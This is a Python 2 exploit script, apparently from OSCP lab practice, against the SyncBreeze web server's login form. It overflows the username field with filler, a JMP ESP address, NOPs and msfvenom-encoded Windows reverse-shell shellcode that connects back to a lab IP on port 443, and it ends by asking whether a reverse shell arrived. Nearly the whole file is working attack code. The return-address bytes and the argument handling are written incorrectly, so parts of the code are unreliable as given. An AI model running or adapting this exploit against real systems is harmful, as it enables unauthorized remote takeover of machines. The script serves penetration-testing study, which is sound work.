#!/usr/bin/python
# coding: utf-8
import socket
import time
import sys

#Python script to controlling EIP SyncBreeze, OSCP LAB


host='192.168.179.10'
port=80

if len(sys.argv) == 2:
    host=sys.argv[1]
    port=sys.argv[2]

url = "http://" +host+"/login"


# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

shellcode = ("\xdb\xce\xbf\xf4\xd3\x9d\x1c\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x78\x13\x03\x8c\xc0\x7f\xe9\x90\x0f\xfd"
"\x12\x68\xd0\x62\x9a\x8d\xe1\xa2\xf8\xc6\x52\x13\x8a\x8a\x5e"
"\xd8\xde\x3e\xd4\xac\xf6\x31\x5d\x1a\x21\x7c\x5e\x37\x11\x1f"
"\xdc\x4a\x46\xff\xdd\x84\x9b\xfe\x1a\xf8\x56\x52\xf2\x76\xc4"
"\x42\x77\xc2\xd5\xe9\xcb\xc2\x5d\x0e\x9b\xe5\x4c\x81\x97\xbf"
"\x4e\x20\x7b\xb4\xc6\x3a\x98\xf1\x91\xb1\x6a\x8d\x23\x13\xa3"
"\x6e\x8f\x5a\x0b\x9d\xd1\x9b\xac\x7e\xa4\xd5\xce\x03\xbf\x22"
"\xac\xdf\x4a\xb0\x16\xab\xed\x1c\xa6\x78\x6b\xd7\xa4\x35\xff"
"\xbf\xa8\xc8\x2c\xb4\xd5\x41\xd3\x1a\x5c\x11\xf0\xbe\x04\xc1"
"\x99\xe7\xe0\xa4\xa6\xf7\x4a\x18\x03\x7c\x66\x4d\x3e\xdf\xef"
"\xa2\x73\xdf\xef\xac\x04\xac\xdd\x73\xbf\x3a\x6e\xfb\x19\xbd"
"\x91\xd6\xde\x51\x6c\xd9\x1e\x78\xab\x8d\x4e\x12\x1a\xae\x04"
"\xe2\xa3\x7b\x8a\xb2\x0b\xd4\x6b\x62\xec\x84\x03\x68\xe3\xfb"
"\x34\x93\x29\x94\xdf\x6e\xba\x5b\xb7\x07\x89\x34\xca\xe7\xec"
"\x7f\x43\x01\x84\x6f\x02\x9a\x31\x09\x0f\x50\xa3\xd6\x85\x1d"
"\xe3\x5d\x2a\xe2\xaa\x95\x47\xf0\x5b\x56\x12\xaa\xca\x69\x88"
"\xc2\x91\xf8\x57\x12\xdf\xe0\xcf\x45\x88\xd7\x19\x03\x24\x41"
"\xb0\x31\xb5\x17\xfb\xf1\x62\xe4\x02\xf8\xe7\x50\x21\xea\x31"
"\x58\x6d\x5e\xee\x0f\x3b\x08\x48\xe6\x8d\xe2\x02\x55\x44\x62"
"\xd2\x95\x57\xf4\xdb\xf3\x21\x18\x6d\xaa\x77\x27\x42\x3a\x70"
"\x50\xbe\xda\x7f\x8b\x7a\xfa\x9d\x19\x77\x93\x3b\xc8\x3a\xfe"
"\xbb\x27\x78\x07\x38\xcd\x01\xfc\x20\xa4\x04\xb8\xe6\x55\x75"
"\xd1\x82\x59\x2a\xd2\x86")



bufferSize=1500
filler = 'A'*780
#EIP = 'B'*4  #10090C83 => /x83/x0C/x09/x10
EIP = '/x83/x0c/x09/x10' #JMP ESP address
offset = 'C'*4
nops = "\x90" * 10
#nops = ""

inputBuffer=filler + EIP + offset +nops + shellcode

try:
  print "\nSending buffer with %s bytes" % len(inputBuffer)

  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host:"+ host + "\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: " +url + "\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.send(buffer)
  s.close()
  print "\nDone did you get a reverse shell?"

except socket.error as e:
	print "\error"+str(e)
	print "\nCould not connect!"
	sys.exit()

